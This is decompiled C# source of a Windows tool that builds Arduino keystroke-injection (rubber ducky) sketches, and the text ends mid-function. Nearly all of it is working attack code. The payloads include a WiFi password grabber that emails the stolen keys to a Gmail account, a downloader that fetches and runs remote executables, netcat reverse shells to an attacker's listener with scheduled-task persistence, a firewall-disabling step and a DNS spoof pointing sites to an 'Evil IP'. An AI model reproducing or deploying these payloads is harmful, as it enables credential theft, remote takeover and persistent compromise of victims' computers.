// Decompiled with JetBrains decompiler
// Type: rubberDuckyToolKit.Form1
// Assembly: rubberDuckyToolKit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13A621C8-3733-4E71-B7A7-4C0574717CA2
// Assembly location: C:\Users\#ShapManasick\Downloads\rubberDuckyToolKit.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using rubberDuckyToolKit.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace rubberDuckyToolKit
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.Timer1.Enabled = true;
      this.RichTextBox1.Visible = false;
      this.RichTextBox1.AppendText("#include <Keyboard.h>\r\n#include <Mouse.h>\r\n\r\nvoid typeKey(int key)\r\n{\r\n\tKeyboard.press(key);\r\n\tdelay(50);\r\n\tKeyboard.release(key);\r\n}\r\nvoid setup()\r\n{\r\n");
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.Label2.Text = this.TrackBar2.Value.ToString();
      this.Label3.Text = this.TrackBar3.Value.ToString();
      this.Label4.Text = this.TrackBar4.Value.ToString();
    }

    public object writeLine(string line)
    {
      this.RichTextBox1.AppendText("\r\n\t" + line.ToString());
      return (object) null;
    }

    public object footer()
    {
      this.RichTextBox1.AppendText("\r\n}\r\nvoid loop()\r\n{\r\n\r\n}");
      return (object) null;
    }

    public object killWindow()
    {
      this.writeLine("delay(1500);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_F4);");
      this.writeLine("Keyboard.releaseAll();");
      this.writeLine("delay(1500);");
      return (object) null;
    }

    public object runProgramDelay()
    {
      this.writeLine("delay(" + this.TrackBar2.Value.ToString() + ");");
      return (object) null;
    }

    public object downloadProgramDelay()
    {
      this.writeLine("delay(" + this.TrackBar3.Value.ToString() + ");");
      return (object) null;
    }

    public object commandExecutionDelay()
    {
      this.writeLine("delay(" + this.TrackBar4.Value.ToString() + ");");
      return (object) null;
    }

    public object executeCommandsOnRunWindows()
    {
      string str = Interaction.InputBox("Enter Command : ", "", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_GUI);");
      this.writeLine("Keyboard.press('r');");
      this.writeLine("Keyboard.releaseAll();");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"" + str + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      return (object) null;
    }

    public object executeCommandsOnPowerShellasAdmin()
    {
      int num1 = int.Parse(Interaction.InputBox("How Many Commands You have to Execute ?", "Amount", "", -1, -1));
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_GUI);");
      this.writeLine("Keyboard.press('r');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"powershell Start-Process powershell -Verb RunAs\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      int num2 = num1;
      int num3 = 1;
      while (num3 <= num2)
      {
        this.writeLine("Keyboard.print(\"" + Interaction.InputBox("Enter Command Number " + num3.ToString() + " : ", "Enter Your Commands", "", -1, -1).ToString() + "\");");
        this.commandExecutionDelay();
        this.writeLine("typeKey(KEY_RETURN);");
        this.writeLine("delay(300);");
        this.writeLine("Keyboard.print(\"exit\");");
        this.writeLine("typeKey(KEY_RETURN);");
        checked { ++num3; }
      }
      return (object) null;
    }

    public object executeCommandsOnPowerShellasCurrentUser()
    {
      int num1 = int.Parse(Interaction.InputBox("How Many Commands You have to Execute ?", "Amount", "", -1, -1));
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_GUI);");
      this.writeLine("Keyboard.press('r');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"powershell\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.runProgramDelay();
      int num2 = num1;
      int num3 = 1;
      while (num3 <= num2)
      {
        this.writeLine("Keyboard.print(\"" + Interaction.InputBox("Enter Command Number " + num3.ToString() + " : ", "Enter Your Commands", "", -1, -1).ToString() + "\");");
        this.commandExecutionDelay();
        this.writeLine("typeKey(KEY_RETURN);");
        this.writeLine("delay(300);");
        this.writeLine("Keyboard.print(\"exit\");");
        this.writeLine("typeKey(KEY_RETURN);");
        checked { ++num3; }
      }
      return (object) null;
    }

    public object executeCommandsOnCMDasAdmin()
    {
      int num1 = int.Parse(Interaction.InputBox("How Many Commands You have to Execute ?", "Amount", "", -1, -1));
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Command Prompt\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      int num2 = num1;
      int num3 = 1;
      while (num3 <= num2)
      {
        this.writeLine("Keyboard.print(\"" + Interaction.InputBox("Enter Command Number " + num3.ToString() + " : ", "Enter Your Commands", "", -1, -1).ToString() + "\");");
        this.commandExecutionDelay();
        this.writeLine("typeKey(KEY_RETURN);");
        checked { ++num3; }
      }
      this.writeLine("delay(300);");
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      return (object) null;
    }

    public object executeCommandsOnCMDCurrentUser()
    {
      int num1 = int.Parse(Interaction.InputBox("How Many Commands You have to Execute ?", "Amount", "", -1, -1));
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_GUI);");
      this.writeLine("Keyboard.press('r');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"cmd\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.runProgramDelay();
      int num2 = num1;
      int num3 = 1;
      while (num3 <= num2)
      {
        this.writeLine("Keyboard.print(\"" + Interaction.InputBox("Enter Command Number " + num3.ToString() + " : ", "Enter Your Commands", "", -1, -1).ToString() + "\");");
        this.commandExecutionDelay();
        this.writeLine("typeKey(KEY_RETURN);");
        checked { ++num3; }
      }
      this.writeLine("delay(300);");
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      return (object) null;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (this.RadioButton1.Checked)
      {
        this.writeLine("delay(500);");
        this.writeLine("Keyboard.press(KEY_LEFT_GUI);");
        this.writeLine("Keyboard.press('d');");
        this.writeLine("Keyboard.releaseAll();");
      }
      if (this.RadioButton3.Checked)
        this.executeCommandsOnRunWindows();
      if (this.RadioButton4.Checked)
        this.executeCommandsOnPowerShellasAdmin();
      if (this.RadioButton5.Checked)
        this.executeCommandsOnPowerShellasCurrentUser();
      if (this.RadioButton6.Checked)
        this.executeCommandsOnCMDasAdmin();
      if (this.RadioButton7.Checked)
        this.executeCommandsOnCMDCurrentUser();
      if (this.RadioButton8.Checked)
        this.netcatReverseShellWithPersistent();
      if (this.RadioButton9.Checked)
        this.netcatReverseShellWithoutPersistent();
      if (this.RadioButton10.Checked)
        this.grabWifiKeys();
      if (this.RadioButton11.Checked)
        this.netcatReversePowershellWithPersistent();
      if (this.RadioButton12.Checked)
        this.netcatReversePowershellWithoutPersistent();
      if (this.RadioButton13.Checked)
        this.localDnsSpoof();
      if (this.RadioButton14.Checked)
        this.fakeUpdatePrank();
      if (this.RadioButton15.Checked)
        this.wifiHotspotEnabler();
      if (this.RadioButton17.Checked)
        this.downloadExecute();
      this.footer();
      StreamWriter streamWriter = MyProject.Computer.FileSystem.OpenTextFileWriter(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\RubberDucky.ino", false);
      string[] lines = this.RichTextBox1.Lines;
      int index = 0;
      while (index < lines.Length)
      {
        string str = lines[index];
        streamWriter.WriteLine(str);
        checked { ++index; }
      }
      streamWriter.Close();
      this.RichTextBox1.Clear();
      this.RichTextBox1.AppendText("#include <Keyboard.h>\r\n#include <Mouse.h>\r\n\r\nvoid typeKey(int key)\r\n{\r\n\tKeyboard.press(key);\r\n\tdelay(50);\r\n\tKeyboard.release(key);\r\n}\r\nvoid setup()\r\n{\r\n");
      int num1 = (int) Interaction.MsgBox((object) "Sketch is at My Document Folder <3 Happy Hacking <3 ", MsgBoxStyle.OkOnly, (object) "Success");
      int num2 = (int) Interaction.MsgBox((object) "NOTE :- There is a Hidden letter at begining of the first line which may cause effect to compilation phase so remove it before head on ", MsgBoxStyle.Critical, (object) "NOTICE");
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      int num = (int) Interaction.MsgBox((object) "If u know How to do Evil Things with cmd and Powershell as on this Tool Contact me I can Add them to This tool", MsgBoxStyle.Information, (object) "Ideas are Welcome");
    }

    public object grabWifiKeys()
    {
      string str1 = Interaction.InputBox("Enter an Gmail Address", "Gmail Address", "", -1, -1);
      string str2 = Interaction.InputBox("Enter Password of the Account", "Password", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Command Prompt\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"cd \\\"%USERPROFILE%\\\\Desktop\\\" & for /f \\\"tokens=2 delims=:\\\" %A in ('netsh wlan show interface ^| findstr \\\"SSID\\\" ^| findstr /v \\\"BSSID\\\"') do set A=%A\");");
      this.commandExecutionDelay();
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"set A=\\\"%A:~1%\\\"\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"netsh wlan show profiles %A% key=clear | findstr /c:\\\"Network type\\\" /c:\\\"Authentication\\\" /c:\\\"Key Content\\\" | findstr /v \\\"broadcast\\\" | findstr /v \\\"Radio\\\">>A.txt\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"for /f \\\"tokens=3 delims=: \\\" %A in ('findstr \\\"Network type\\\" A.txt') do set B=%A\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"for /f \\\"tokens=2 delims=: \\\" %A in ('findstr \\\"Authentication\\\" A.txt') do set C=%A\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"for /f \\\"tokens=3 delims=: \\\" %A in ('findstr \\\"Key Content\\\" A.txt') do set D=%A\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"del A.txt\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"powershell\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$SMTPServer = 'smtp.gmail.com'\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$SMTPInfo.EnableSsl = $true\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + str1 + "','" + str2 + "')\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$ReportEmail = New-Object System.Net.Mail.MailMessage\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$ReportEmail.From = '" + str1 + "'\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$ReportEmail.To.Add('" + str1 + "')\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$ReportEmail.Subject = 'WiFi key grabber'\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$ReportEmail.Body = (Get-Content Log.txt | out-string)\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"$SMTPInfo.Send($ReportEmail)\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"del Log.txt\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      return (object) null;
    }

    public object fakeUpdatePrank()
    {
      string str = Interaction.InputBox("Type Windows Version Number Only ex : 7 , 8 , 10", "Just Enter 7 8 or 10", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_GUI);");
      this.writeLine("Keyboard.press('r');");
      this.writeLine("Keyboard.releaseAll();");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"https://fakewindowsupdate.com/gb/" + str.ToString() + "/index.html\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.runProgramDelay();
      this.writeLine("typeKey(KEY_F11);");
      return (object) null;
    }

    public object wifiHotspotEnabler()
    {
      string str1 = Interaction.InputBox("Enter Wifi Network Name :", "Name", "", -1, -1);
      string str2 = Interaction.InputBox("Enter new Password :", "Password", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Command Prompt\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"netsh wlan set hostednetwork mode=allow ssid=" + str1.ToString() + " key=" + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"netsh wlan start hostednetwork\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"netsh firewall set opmode disable\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      return (object) null;
    }

    public object downloadExecute()
    {
      string str1 = Interaction.InputBox("Enter Donwload link With Protocol ex: http://domain.com/file.exe", "File to Download", "", -1, -1);
      string str2 = Interaction.InputBox("File Will Be Downloaded to system32 directory enterfile name u want to save with extension and a Unique name", "Warning", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Powershell\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"wget '" + str1.ToString() + "' -OutFile " + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.downloadProgramDelay();
      this.writeLine("Keyboard.print(\"cmd\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"START /MIN " + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      return (object) null;
    }

    public object netcatReverseShellWithPersistent()
    {
      string str1 = Interaction.InputBox("Enter Netcat Donwload link With Protocol ex: http://domain.com/file.exe", "File to Download", "", -1, -1);
      string str2 = Interaction.InputBox("File Will Be Downloaded to system32 directory enter file name u want to save with extension (exe) and a Unique name", "Warning", "", -1, -1);
      string str3 = Interaction.InputBox("Enter Listner IP : ", "IP", "", -1, -1);
      string str4 = Interaction.InputBox("Enter PORT :", "Port", "", -1, -1);
      string str5 = Interaction.InputBox("Enter Payload Execution timeout : ", "ExecutionTimer", "", -1, -1);
      string str6 = Interaction.InputBox("Enter Persistent Backdoor Name with (*.bat) extension ", "Persistent", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Powershell\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"wget '" + str1.ToString() + "' -OutFile " + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.downloadProgramDelay();
      this.writeLine("Keyboard.print(\"cmd\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"echo START /MIN " + str2.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str3.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str4.ToString() + " \");");
      this.writeLine("Keyboard.print(\"-e cmd.exe -d >> " + str6.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"schtasks /create /tn TaskSystem /tr C:/Windows/System32/" + str6.ToString() + " /sc minute /mo " + str5.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"START /MIN " + str2.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str3.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str4.ToString() + " \");");
      this.writeLine("Keyboard.print(\"-e cmd.exe -d\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      return (object) null;
    }

    public object netcatReversePowershellWithPersistent()
    {
      string str1 = Interaction.InputBox("Enter Netcat Donwload link With Protocol ex: http://domain.com/file.exe", "File to Download", "", -1, -1);
      string str2 = Interaction.InputBox("File Will Be Downloaded to system32 directory enter file name u want to save with extension (exe) and a Unique name", "Warning", "", -1, -1);
      string str3 = Interaction.InputBox("Enter Listner IP : ", "IP", "", -1, -1);
      string str4 = Interaction.InputBox("Enter PORT :", "Port", "", -1, -1);
      string str5 = Interaction.InputBox("Enter Payload Execution timeout : ", "ExecutionTimer", "", -1, -1);
      string str6 = Interaction.InputBox("Enter Persistent Backdoor Name with (*.bat) extension ", "Persistent", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Powershell\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"wget '" + str1.ToString() + "' -OutFile " + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.downloadProgramDelay();
      this.writeLine("Keyboard.print(\"cmd\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"echo START /MIN " + str2.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str3.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str4.ToString() + " \");");
      this.writeLine("Keyboard.print(\"-e powershell.exe -d >> " + str6.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"schtasks /create /tn TaskSystem /tr C:/Windows/System32/" + str6.ToString() + " /sc minute /mo " + str5.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"START /MIN " + str2.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str3.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str4.ToString() + " \");");
      this.writeLine("Keyboard.print(\"-e powershell.exe -d\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      return (object) null;
    }

    public object netcatReverseShellWithoutPersistent()
    {
      string str1 = Interaction.InputBox("Enter Netcat Donwload link With Protocol ex: http://domain.com/file.exe", "File to Download", "", -1, -1);
      string str2 = Interaction.InputBox("File Will Be Downloaded to system32 directory enter file name u want to save with extension (exe) and a Unique name", "Warning", "", -1, -1);
      string str3 = Interaction.InputBox("Enter Listner IP : ", "IP", "", -1, -1);
      string str4 = Interaction.InputBox("Enter PORT :", "Port", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Powershell\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"wget '" + str1.ToString() + "' -OutFile " + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.downloadProgramDelay();
      this.writeLine("Keyboard.print(\"cmd\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"START /MIN " + str2.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str3.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str4.ToString() + " \");");
      this.writeLine("Keyboard.print(\"-e cmd.exe -d\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      return (object) null;
    }

    public object netcatReversePowershellWithoutPersistent()
    {
      string str1 = Interaction.InputBox("Enter Netcat Donwload link With Protocol ex: http://domain.com/file.exe", "File to Download", "", -1, -1);
      string str2 = Interaction.InputBox("File Will Be Downloaded to system32 directory enter file name u want to save with extension (exe) and a Unique name", "Warning", "", -1, -1);
      string str3 = Interaction.InputBox("Enter Listner IP : ", "IP", "", -1, -1);
      string str4 = Interaction.InputBox("Enter PORT :", "Port", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Powershell\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.print(\"wget '" + str1.ToString() + "' -OutFile " + str2.ToString() + "\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.downloadProgramDelay();
      this.writeLine("Keyboard.print(\"cmd\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"START /MIN " + str2.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str3.ToString() + " \");");
      this.writeLine("Keyboard.print(\"" + str4.ToString() + " \");");
      this.writeLine("Keyboard.print(\"-e powershell.exe -d\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      return (object) null;
    }

    public object localDnsSpoof()
    {
      string str1 = Interaction.InputBox("Enter Web address starting with * ex:(*.facebook.com)", "Address", "", -1, -1);
      string str2 = Interaction.InputBox("Enter Evil IP", "Evil IP", "", -1, -1);
      this.writeLine("Keyboard.begin();");
      this.writeLine("delay(500);");
      this.writeLine("typeKey(KEY_LEFT_GUI);");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.print(\"Command Prompt\");");
      this.writeLine("delay(500);");
      this.writeLine("Keyboard.press(KEY_LEFT_SHIFT);");
      this.writeLine("Keyboard.press(KEY_LEFT_CTRL);");
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press(KEY_RETURN);");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
      this.writeLine("Keyboard.press(KEY_LEFT_ALT);");
      this.writeLine("Keyboard.press('y');");
      this.writeLine("Keyboard.releaseAll();");
      this.runProgramDelay();
